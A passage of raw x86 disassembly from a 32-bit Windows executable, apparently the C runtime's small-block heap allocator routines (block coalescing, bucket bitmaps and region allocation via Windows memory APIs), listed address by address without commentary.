  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
